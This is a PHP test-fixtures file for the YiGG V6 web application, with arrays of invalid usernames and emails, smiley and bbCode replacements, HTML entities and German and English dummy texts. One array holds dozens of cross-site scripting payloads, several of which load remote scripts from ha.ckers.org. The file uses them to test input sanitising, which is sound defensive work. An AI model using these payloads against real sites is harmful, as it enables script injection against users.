<?php

/**
 * Several fixtures for the functional and unit testing
 * @author Robert Curth <curth@yigg.de>
 * @version YiGG V6 FunkyAPE
 * @package YiGG V6
 * @subpackage APETests
 *
 * Before you start creating really long tests - please chech out this little arrays,
 * and if you think sth. could be used in more then one test, then please - put it here..
 */

/**
 * Array with bad usernames
 */ 

$badUsernames = array('yigg','Yigg','yIgg','y!gg','Y!GG','Y!gg','marvin','admin','root','Admin','ROOT');

/**
 * Array with bad emails
 */ 

$badEmails = array('fooo.com', 'foo@foo^foo.de', 'foo @foo.de', 'foo foo@foo.de','foo@_f00.de','foo@foo');

/**
 * Array of Smilie-Replacements
 * These Smilies should be replaced automaticaly, by yiggTools. 
 * So should they in many outputs of the functional tests.
 *
 */ 


$smilieReplacements = array(	
	array('<:-(',	'<img heigth="15px" src="images/smilies/angry.png" alt"Angry" />'),
	array('<:(',	'<img heigth="15px" src="images/smilies/angry.png" alt"Angry" />'),
	array(':-s',	'<img heigth="15px" src="images/smilies/confused.png" alt"Confused" />'),
	array(':s',		'<img heigth="15px" src="images/smilies/confused.png" alt"Confused" />'),
	array('8-)',	'<img heigth="15px" src="images/smilies/cool.png" alt"Cool" />'),
	array('8)',		'<img heigth="15px" src="images/smilies/cool.png" alt"Cool" />'),
	array(':-)',	'<img heigth="15px" src="images/smilies/happy.png" alt"Happy" />'),
	array(':)',		'<img heigth="15px" src="images/smilies/happy.png" alt"Happy" />'),
	array(':-|',	'<img heigth="15px" src="images/smilies/ok.png" alt"Ok" />'),
	array(':|',		'<img heigth="15px" src="images/smilies/ok.png" alt"Ok" />'),
	array(':-o',	'<img heigth="15px" src="images/smilies/oooh.png" alt"Oooh" />'),
	array(':-O',	'<img heigth="15px" src="images/smilies/surprised.png" alt"Surprised" />'),
	array(':-(',	'<img heigth="15px" src="images/smilies/sad.png" alt"Sad" />'),
	array(':(',		'<img heigth="15px" src="images/smilies/sad.png" alt"Sad" />'),
	array(':-o',	'<img heigth="15px" src="images/smilies/oooh.png" alt"Oooh" />')	
);

/**
 * Array of bad XSS-Strings
 * Chech Wiki on trac.yigg.de for more Information.. They have to be removed. 
 */ 


$xsstrings = array(
	"<script>alert('xss');</script>",	
	"<strong><strong>",
	"<IMG SRC=JaVaScRiPt:alert('XSS')>",
	"<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
	"<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
	"<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
	"'';!--\"<XSS>=&{()}",	
	"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
	"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
	"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
	"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
	"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
	"<IMG SRC=\"jav	ascript:alert('XSS');\">",
	"<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
	"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
	"<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
	"<IMG
	SRC
	=
	\"
	j
	a
	v
	a
	s
	c
	r
	i
	p
	t
	:
	a
	l
	e
	r
	t
	(
	'
	X
	S
	S
	'
	)
	\"
	>",
	"<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
	"<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
	"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(\"XSS\")>",
	"<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
	"<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
	"<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>",
	"<SCRIPT SRC=//ha.ckers.org/.j>",
	"<IMG SRC=\"javascript:alert('XSS')\"",
	"<iframe src=http://ha.ckers.org/scriptlet.html <",
	"<SCRIPT>a=/XSS/
	alert(a.source)</SCRIPT>",
	"\\\";alert('XSS');//",
	"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
	"<IMG DYNSRC=\"javascript:alert('XSS')\">",
	"<IMG LOWSRC=\"javascript:alert('XSS')\">",
	"<BGSOUND SRC=\"javascript:alert('XSS');\">",
	"<BR SIZE=\"&{alert('XSS')}\">",
	"<LAYER SRC=\"http://ha.ckers.org/scriptlet.html\"></LAYER>",
	"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
	"<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">",
	"<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>",
	"<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">",
	"<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>",
	"<XSS STYLE=\"behavior: url(xss.htc);\">",
	"<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",
	"<IMG SRC='vbscript:msgbox(\"XSS\")'>",
	"<IMG SRC=\"mocha:[code]\">",
	"<IMG SRC=\"livescript:[code]\">",
	"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
	"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
	"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
	"<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
	"<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
	"<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
	"<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
	"<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
	"<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
	"<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">",
	"<DIV STYLE=\"width: expression(alert('XSS'));\">",
	"<STYLE>@im\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
	"<XSS STYLE=\"xss:expression(alert('XSS'))\">",
	"exp/*<A STYLE='no\xss:noxss(\"*//*\");
	xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'>",
	"<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
	"<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
	"<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
	"<!--[if gte IE 4]>
	<SCRIPT>alert('XSS');</SCRIPT>
	<![endif]-->",
	"<BASE HREF=\"javascript:alert('XSS');//\">",
	"<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>",
	"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>",
	"<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>",
	"<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
	"	<HTML xmlns:xss>
		  <?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\">
		  <xss:xss>XSS</xss:xss>
		</HTML>",
	"	<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]>
		</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
	"<XML ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:alert('XSS')\"&gt;</B></I></XML>
	<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>",
	"<XML SRC=\"xsstest.xml\" ID=I></XML>
	<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
	"<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">
	<?import namespace=\"t\" implementation=\"#default#time2\">
	<t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\">",
	"<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>",
	"<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
	"<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
	"<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
	"<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
	"<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
	"<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
	"<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
);

/**
 * Array of bbCode-Replacements
 * BbCode should be replaced automaticaly, by yiggTools. 
 *
 */
	
$bbCodeReplacements = array(
	array('[b]foobar[/b]' , '<strong>foobar</strong>'),
	array('[i]foobar[/i]' , '<em>foobar</em>'),
	array('[u]foobar[/u]' ,  'foobar'),
	array('[url]http://www.foobar.de[/url]','<a href="http://www.foobar.de" title="http://www.foobar.de">http://www.foobar.de</a>'),
	array('[quote]foobar[/quote]','<quote>foobar</foobar>'),
	array('[link]foobar[/link]','<a href="http://www.foobar.de" title="http://www.foobar.de">http://www.foobar.de</a>'),
	array('[img]http://foo.de/foobar.jpg[/img]','<img src="http://foo.de/foobar.jpg" alt="image" />'),
	array('[bold]foobar[/bold]','<strong>foobar</strong>'),
	array('[code]foobar[/code]','<pre>foobar</pre>'),
	array('[list]foobar[/list]','<ul>foobar</ul>'),
	array('*foobar','<li>foobar</li>'),
	array('[size=1]foobar[/size]','<h1>foobar</h1>'),
	array('[size=2]foobar[/size]','<h2>foobar</h2>'),
	array('[size=3]foobar[/size]','<h3>foobar</h3>'),
	array('[size=4]foobar[/size]','<h4>foobar</h4>'),
	array('[size=5]foobar[/size]','<h5>foobar</h5>')
);		

/**
 * Array of bbCode-Replacements
 * Some HTML should be replaced automaticaly, by yiggTools. 
 *
 */
	
$htmlReplacements = array(
	array('<b>foobar</b>','<strong>foobar</foobar>'),
	array('<span style="font-weight: bold;">foobar</span>','<strong>foobar</strong>'),
	array('<span style="text-decoration: line-through;">foobar</span>','<del>foobar</del>'),
	array('<span style="text-decoration: underline;">foobar</span>','foobar'),
	array('<i>foobar</i>','<em>foobar</em>'),
	array('<a href="http://foo.com">foobar</a>','<a href="http://foo.com" title="foobar http://www.foo.com">foobar</a>'),
	array('<a href="javascript:foo">foobar</a>','foobar'),
	array('<u>foobar</u>','<em>foobar</em>'),
	array('<br><br>','<p>'),
	array('<br />','<p>'),
	array('<p><p>','<p>')
);

/**
 * Array containing all XHTML-Entities from W3C
 * http://www.w3.org/TR/xhtml-modularization/dtd_module_defs.html
 */

$htmlEntities = array(
	'greekLetters' => array(
		array('&Alpha;','Alpha'),
		array('&Beta;','Beta'),
		array('&Gamma;','Gamma'),
		array('&Delta;','Delta'),
		array('&Epsilon;','Epsilon'),
		array('&Zeta;','Zeta'),
		array('&Eta;','Eta'),
		array('&Theta;','Theta'),
		array('&Iota;','Iota'),
		array('&Kappa;','Kappa'),
		array('&Lambda;','Lambda'),
		array('&Mu;','Mu'),
		array('&Nu;','Nu'),
		array('&Xi;','Xi'),
		array('&Omicron;','Omnicron'),
		array('&Pi;','Pi'),
		array('&Rho;','Rho'),
		array('&Sigma;','Sigma'),
		array('&Tau;','Tau'),
		array('&Upsilon;','Upsilon'),
		array('&Phi;','Phi'),
		array('&Chi;','Chi'),
		array('&Psi;','Psi'),
		array('&Omega;','Omega'),
		array('&alpha;','alpha'),
		array('&beta;','beta'),
		array('&gamma;','gamma'),
		array('&delta;','delta'),
		array('&epsilon;','epsilon'),
		array('&zeta;','zeta'),
		array('&eta;','eta'),
		array('&theta;','theta'),
		array('&iota;','iota'),
		array('&kappa;','kappa'),
		array('&lambda;','lambda'),
		array('&mu;','mu'),
		array('&nu;','nu'),
		array('&xi;','xi'),
		array('&omicron;','omnicron'),
		array('&pi;','pi'),
		array('&rho;','rho'),
		array('&sigmaf;','sigma'),
		array('&sigma;','sigma'),
		array('&tau;','tau'),
		array('&upsilon;','upsilon'),
		array('&phi;','phi'),
		array('&chi;','chi'),
		array('&psi;','psi'),
		array('&omega;','omega'),
		array('&thetasym;','theta'),
		array('&upsih;','upsith'),
		array('&piv;','pi')
	),

	'latinLetters' => array(
		array('&Agrave;','A'),
		array('&Aacute;','A'),
		array('&Acirc;','A'),
		array('&Atilde;','A'),
		array('&Auml;','Ae'),
		array('&Aring;','A'),
		array('&AElig;','Ae'),
		array('&Ccedil;','C'),
		array('&Egrave;','E'),
		array('&Eacute;','E'),
		array('&Ecirc;','E'),
		array('&Euml;','Ee'),
		array('&Igrave;','I'),
		array('&Iacute;','I'),
		array('&Icirc;','I'),
		array('&Iuml;','Ie'),
		array('&ETH;',''),
		array('&Ntilde;','N'),
		array('&Ograve;','O'),
		array('&Oacute;','O'),
		array('&Ocirc;','O'),
		array('&Otilde;','O'),
		array('&Ouml;','Oe'),
		array('&times;',' x '),
		array('&Oslash;','O'),
		array('&Ugrave;','U'),
		array('&Uacute;','U'),
		array('&Ucirc;','U'),
		array('&Uuml;','Ue'),
		array('&Yacute;','Y'),
		array('&THORN;',''),
		array('&szlig;','ss'),
		array('&agrave;','a'),
		array('&aacute;','a'),
		array('&acirc;','a'),
		array('&atilde;','a'),
		array('&auml;','ae'),
		array('&aring;','a'),
		array('&aelig;','ae'),
		array('&ccedil;','c'),
		array('&egrave;','e'),
		array('&eacute;','e'),
		array('&ecirc;','e'),
		array('&euml;','eu'),
		array('&igrave;','i'),
		array('&iacute;','i'),
		array('&icirc;','i'),
		array('&iuml;','ie'),
		array('&eth;',''),
		array('&ntilde;','n'),
		array('&ograve;','o'),
		array('&oacute;','o'),
		array('&ocirc;','o'),
		array('&otilde;','o'),
		array('&ouml;','oe'),
		array('&divide;',''),
		array('&oslash;',''),
		array('&ugrave;','u'),
		array('&uacute;','u'),
		array('&ucirc;','u'),
		array('&uuml;','ue'),
		array('&yacute;','y'),
		array('&thorn;',''),
		array('&yuml;','ye'),
		array('&OElig;','Oe'),
		array('&oelig;','oe'),
		array('&Scaron;','S'),
		array('&scaron;','s'),
		array('&Yuml;','Ye')
	),

	'currencies' => array(
		array('&cent;','cent'),
		array('&pound;','pound'),
		array('&yen;','yen'),
		array('&euro;','euro')
	),

	'words' => array(
		array('&deg;','degree'),
		array('&copy;','copyright'),
		array('&prime;','feet'),
	),

	'specialChars' => array(
		array('&reg;',''),
		array('&curren;',''),
		array('&circ;',''),
		array('&nbsp;',''),
		array('&iexcl;',''),
		array('&brvbar;',''),
		array('&sect;',''),
		array('&uml;',''),
		array('&ordf;',''),
		array('&laquo;',''),
		array('&not;',''),
		array('&shy;',''),
		array('&macr;',''),
		array('&plusmn;',''),
		array('&sup2;',''),
		array('&sup3;',''),
		array('&acute;',''),
		array('&micro;',''),
		array('&para;',''),
		array('&middot;',''),
		array('&cedil;',''),
		array('&sup1;',''),
		array('&ordm;',''),
		array('&raquo;',''),
		array('&frac14;',''),
		array('&frac12;',''),
		array('&frac34;',''),
		array('&iquest;',''),
		array('&lt;',''),
		array('&lt;',''),
		array('&gt;',''),
		array('&amp;',''),
		array('&apos;',''),
		array('&quot;',''),
		array('&tilde;',''),
		array('&ensp;',''),
		array('&emsp;',''),
		array('&thinsp;',''),
		array('&zwnj;',''),
		array('&zwj;',''),
		array('&lrm;',''),
		array('&rlm;',''),
		array('&ndash;',''),
		array('&mdash;',''),
		array('&lsquo;',''),
		array('&rsquo;',''),
		array('&sbquo:',''),
		array('&ldquo;',''),
		array('&rdquo;',''),
		array('&bdquo;',''),
		array('&dagger;',''),
		array('&Dagger;',''),
		array('&permil;',''),
		array('&lsaquo;',''),
		array('&rsaquo;',''),
		array('&fnof;',''),
		array('&bull;',''),
		array('&hellip;',''),
		array('&Prime;',''),
		array('&oline;',''),
		array('&frasl;',''),
		array('&weierp;',''),
		array('&image;',''),
		array('&real;',''),
		array('&trade;',''),
		array('&alefsym;',''),
		array('&larr;',''),
		array('&uarr;',''),
		array('&rarr;',''),
		array('&darr;',''),
		array('&harr;',''),
		array('&crarr;',''),
		array('&lArr;',''),
		array('&uArr;',''),
		array('&rArr;',''),
		array('&dArr;',''),
		array('&hArr;',''),
		array('&forall;',''),
		array('&part;',''),
		array('&exist;',''),
		array('&empty;',''),
		array('&nabla;',''),
		array('&isin;',''),
		array('&notin;',''),
		array('&ni;',''),
		array('&prod;',''),
		array('&sum;',''),
		array('&minus;',''),
		array('&lowast;',''),
		array('&radic;',''),
		array('&prop;',''),
		array('&infin;',''),
		array('&ang;',''),
		array('&and;',''),
		array('&or;',''),
		array('&cap;',''),
		array('&cup;',''),
		array('&int;',''),
		array('&there4;',''),
		array('&sim;',''),
		array('&cong;',''),
		array('&asymp;',''),
		array('&ne;',''),
		array('&equiv;',''),
		array('&le;',''),
		array('&ge;',''),
		array('&sub;',''),
		array('&sup;',''),
		array('&nsub;',''),
		array('&sube;',''),
		array('&supe;',''),
		array('&oplus;',''),
		array('&otimes;',''),
		array('&perp;',''),
		array('&sdot;',''),
		array('&lceil;',''),
		array('&rceil;',''),
		array('&lfloor;',''),
		array('&rfloor;',''),
		array('&lang;',''),
		array('&rang;',''),
		array('&loz;',''),
		array('&spades;',''),
		array('&clubs;',''),
		array('&hearts;',''),
		array('&diams;','')
	)
);

$dummyTexts = array(
	'deDE' => "Ich kann gar nicht sagen, wie wohl ich mich in meinem alten Heim fühle!

Es regnet seit gestern Bindfaden, und die Zugvögel des Hotels, das Gesindel mit Rucksack oder Lodenkleid knurrt über solch unliebsame Unterbrechung. Die guten Leute scheinen der Ansicht zu sein, daß die äußerst mangelhaften Toiletten ihrerseits den Garda zu einer ganz besonders raffinierten Toilette seinerseits verpflichten. Ich finde es im Gegenteil recht behaglich, von den lieblichen Düften der Küche zu dem strengen Bratenparfüm des Speisesaals abwechselnd hinauf- und hinabzusteigen, im Konversationszimmer die Seufzer der Damen, im Fumoir die Verwünschungen der Herren anzuhören, und dabei zu konstatieren, daß gerade dieser Regen das dienende Hotelpersonal mit heimlicher Freude erfüllt. Sonnenschein, der die Wadenstrümpfler so angenehm kitzelt, ist den Stubenmädchen eine Qual. Sie hören die Wagen vorfahren, die Namen der schönsten Ausflugsorte werden genannt, der überfüllte Vergnügungsdampfer am Nachmittag pfeift impertinent; man sieht's diesen Arbeitstieren an, daß sie auch gern hinaus möchten, daß bei Sonnenschein der Küchendampf besonders unangenehm beizt, der Stubenbesen sich mürrisch langsam schwingt. Aber bei Regen erhellen sich sofort die dienenden Gesichter. Wenn die Gnädige weint, lächelt die Jungfer ... Ich habe es stets vermieden, mit den einen oder andern einseitig zu empfinden. Ich empfinde, wie's mir praktisch scheint, und augenblicklich empfinde ich mit den Stubenmädchen.

Aber es ist auch wirklich hübsch nach den Irrfahrten meines Rittertums, sagen wir ruhig Don Quichottes, sich hier auf einem Fensterbrett wiederzufinden, warm, trocken, in den Regen blinzelnd und sehr froh, daß der Honigmond vorüber, der Liebespfad nach Gargnano zu den überwundenen Dingen gehört. Ich denke jetzt über die Liebe kühl, über die Ehe verächtlich. Wenn ältere Ehepaare an mir vorbeikommen, bekreuze ich mich stets, daß ich nicht in der Lage bin, entweder zu zanken oder zu knurren, in welche Seelenstimmungen die Menschenliebe nach einigen Ehejahren ausklingt ... Wenn ganz junge Liebende an mir vorüber wollen, ohne mich überhaupt zu bemerken, ohne auf der Welt für irgend etwas andres Sinn zu haben, als die blödesten Zärtlichkeiten beiderseits, da schnurre ich besonders ironisch und denke: ›Wenn eure Liebe nur erst einige Jahre älter ist!‹ ... Liebe und Sonnenschein passen vorzüglich zueinander, aber einen wunderschönen Taumel bis zu Regentagen und Kindergeschrei ausdehnen zu wollen, ist wahrhaft menschlicher Wahnsinn. Ich preise diese ehelichen Zärtlichkeiten nur bei Gartenvögeln. Man delektiert sich an der schmackhaften Brut und erwischt vielleicht noch die zärtlich flatternde Mutter.

Wir sind jetzt in der Zeit, wo die afrikanischen Vogelreisenden sich einzufinden pflegen – sehr angenehme Gäste, denen das Quartier in unserm Magen auch wahrscheinlich am zuträglichsten ist. Der Schneider des Ortes wenigstens läuft schon im Regen mit einer tropfenden Muskete herum und knallt ohne Besinnen auf den See hinaus. Die Deutschen finden das grausam, ich finde es nur töricht. Denn die Taucher, nach denen er schießt, haben eine ausgesprochene Abneigung gegen die Bratpfanne und stoßen getroffen sofort in die Tiefe, wo sie dann der Küche verloren sind ... Aber Menschen sind eben Gefühlsphantasten. Und der kleine, rabiate Schneider mit seinem löcherigen Karbonarihut und der alten Muskete, die ihm nächstens in Stücken um den Kopf fliegen wird, unterscheidet sich nur scheinbar von diesem Rin, der mir neulich einen Sperling recht unhöflich entriß. Er nannte mich dabei: »weißer Schuft!«

Menschen mit solchen Manieren können mich ebensowenig beleidigen, wie sie mich erschrecken können. Aber unser Gefühl kühlt sich dabei ab. Nicht etwa wegen dieses Vogels! Ich brauche nur in die Küche hinabzusteigen, um mich eines viel zarteren Hühnerbeins zu versichern. Aber den Mangel an Takt und Selbstbeherrschung verurteile ich. Dieser Mann ist überhaupt ein Gimpel. Er beleidigt seine Gönner, um zu seinen Feinden überzugehen. Ein richtiger deutscher Narr! Wenn ich irgend etwas auf der Welt nicht mag, so ist es gefühlvolle Unvernunft. Wie sein Tagebuch zeigt, war er bereits aus dem Netz, konnte gehen, wohin er wollte, und der albernste Köder genügt, um ihn wieder einzufangen. Jetzt wird die reizende Josefa, in der ich von Tag zu Tag mehr jene diplomatische Feinschmeckerei entdecke, die uns befiehlt, sich an dem lebenden Vogel recht lange zu erfreuen, ehe wir den toten verzehren, erst wirklich anfangen mit ihm zu spielen. Jetzt wird sie ihn verliebt machen, sich an den Zuckungen seines Herzens freuen, zuletzt diesen Gimpel ganz ruhig verhungern lassen ... Es kommt alles, wie ich gesagt habe: der warme Sonnenschein weckte die Gefühle, der bedeckte Himmel ließ sie ausreifen, die Regenwoche jetzt gibt einem unverbesserlichen Toren den Rest.

Und dem widerspricht keineswegs, daß die junge Gräfin mich neulich in Abwesenheit ihrer Terriers zu einer wahren Kakesorgie ermutigte. Diese Liebenswürdigkeit gilt nicht mir, sie gilt meinem früheren Protegé. Aber im Grunde ist es nur das gewisse Mitleid, das auch uns vielleicht beim Anblick gefiederter Sänger ergreift und uns verleitet, sie noch möglichst lange unter unsrer Aufsicht hüpfen zu lassen; aber weidgerecht erwürgt wird der betreffende Vogel doch. Dagegen das Interesse der jungen Dame für mich wird nicht nur bleiben, es wird sogar wachsen, während ihre Mitleidsregungen für meinen Protegé sehr bald in nichts zerflattern. Nur das wirklich Gediegene dauert!

Und im Vorgefühl solcher Wandlung halte ich es für klug, mich zu salvieren, ehe ich salviert werde. Der Mann imponiert mir nicht mehr! Eines Tages wird er verschwunden sein, ohne irgendeine Spur hinterlassen zu haben, aber die junge Dame wird sich von jetzt ab mehr und mehr an mich attachieren. Sie ist mir sehr sympathisch. Sie hat jene spielende Sicherheit, die unser Geschlecht besonders hochhält, und zu der ich reuig zurückkehre, nachdem sich die Krafthubereien dieses Rin und die himmelstürmende Leidenschaft meines Tristan als eitel Trug erwiesen haben. Ich fühle wieder jene Lust zur Intrige in mir keimen, die uns Katzen mit Diplomaten und Frauen stets einen wird. Dieser Rin wird uns noch zu schaffen machen. Ich bin neugierig, wie seine sonst sehr kräftige Konstitution sich in diesem hoffnungslosen Kampfe ausleben wird. Der Vogel, der noch flattern kann, ist ein dankbareres Studienobjekt als der hilflos aus dem Nest gefallene Spatz.

Ich hätte bei meiner Kakesvisite gern die Korrespondenz der jungen Dame etwas revidiert, – nicht das, was sie schreibt, sondern das, was sie nicht schreibt, wäre mir wichtig. Aber sie ist entschieden ordentlicher als Herr Rin. Die Briefe an ihren Bräutigam schickt sie sofort ab, und die seinen verschließt sie. Der einzige, unterbrochene, den ich neulich las, bedeutet wahrscheinlich einen Wendepunkt.

Meine Visite war, wie gesagt, nur kurz, draußen bellten die Terriers. Vielleicht schwankt sie auch noch. Frauen und Katzen find ja untaxierbar ... Ich mußte mich darum über die Stimmung im allgemeinen vergewissern und ging zum zweiten Salon. Dort klatschte natürlich der Kommissionsrat wieder, Quedenbergs waren auch da, und dieser sächsische Uhrenfabrikant a.D. verstieg sich sogar zu der Aeußerung, daß die Komtesse Angern vielleicht doch etwas leicht sei. Die Gräfin antwortete ihm präzis: »So leicht wie Sie, Herr Kommissionsrat.« Darauf wurde herzlich gelacht, der alte Herr ließ vor Angst seinen Meerschaumkopf fallen, und ich glaube, daß ihn die Nichte etwas schadenfroh ansah. Diese Nichte kann Kater nicht anfassen. Ich halte das für ein Zeichen von großer Geistesarmut.

Bei Rin war ich auch, und zwar längere Zeit. Der Mann ist schneller verrückt geworden, als ich dachte. Jedoch sein Tagebuch kann selbst sprechen.

Ich mag in gewissen Dingen harmlos sein, aber wenn alle Regentage auf dieser Welt so reizend sind, so mag's meinetwegen immer regnen.

Ich esse allerdings noch an meinem andern Tisch, und selbst die direkte Bitte dieses entzückenden Geschöpfes macht mich nicht wanken. Es wurde mir höllisch schwer. Doch ich denke, ein Mann darf sich nicht beliebig von einem Platz zum andern schieben lassen, wie ein überflüssiges Paket. Josefa schmollte darüber ein wenig, nannte mich undankbar und beschwor, sie würde niemals wieder so offen mit mir sprechen wie neulich auf dem Wege von Gargnano. Und unberechenbar, wie sie doch ist, erklärte sie vierundzwanzig Stunden später, daß ich eigentlich recht habe.

»Ich habe mir's überlegt, Herr Rin. Männer sollen sich nicht kommandieren lassen. Ich glaube, wenn Frauen herrschen wollen, müssen sie erst verachten können. Ich werde Peter diesen letzten Gedankensplitter sofort übermitteln, aber als eignen, höchst ernsthaften, nicht wie die vom Kommissionsrat, wo ich schon beim Schreiben Tränen lache ... Aber trotzdem, ich kommandiere so viel lieber, als ich gehorche!«",

'enEN' => 	'A squat grey building of only thirty-four stories. Over the main entrance the words, Central London Hatchery and Conditioning Centre, and, in a shield, the World State’s motto, Community, Identity, Stability.

	The enormous room on the ground floor faced towards the north. Cold for all the summer beyond the panes, for all the tropical heat of the room itself, a harsh thin light glared through the windows, hungrily seeking some draped lay figure, some pallid shape of academic goose-flesh, but finding only the glass and nickel and bleakly shining porcelain of a laboratory. Wintriness responded to wintriness. The overalls of the workers were white, their hands gloved with a pale corpse-coloured rubber. The light was frozen, dead, a ghost. Only from the yellow barrels of the microscopes did it borrow a certain rich and living substance, lying along the polished tubes like butter, streak after luscious streak in long recession down the work tables.

	‘And this,’ said the Director opening the door, ‘is the Fertilizing Room.’

	Bent over their instruments, three hundred Fertilizers were plunged, as the Director of Hatcheries and Conditioning entered the room, in the scarcely breathing silence, the absentminded, soliloquizing hum or whistle, of absorbed concentration. A troop of newly arrived students, very young, pink and callow, followed nervously, rather abjectly, at the Director’s heels. Each of them carried a note-book, in which, whenever the great man spoke, he desperately scribbled. Straight from the horse’s mouth. It was a rare privilege. The D.H.C. for Central London always made a point of personally conducting his new students round the various departments.

	‘Just to give you a general idea,’ he would explain to them. For of course some sort of general idea they must have, if they were to do their work intelligently—though as little of one, if they were to be good and happy members of society, as possible. For particulars, as every one knows, make for virtue and happiness; generalities are intellectually necessary evils. Not philosophers, but fret-sawyers and stamp collectors compose the backbone of society.

	‘To-morrow,’ he would add, smiling at them with a slightly menacing geniality, ‘you’ll be settling down to serious work. You won’t have time for generalities. Meanwhile…’

	Meanwhile, it was a privilege. Straight from the horse’s mouth into the note-book. The boys scribbled like mad.

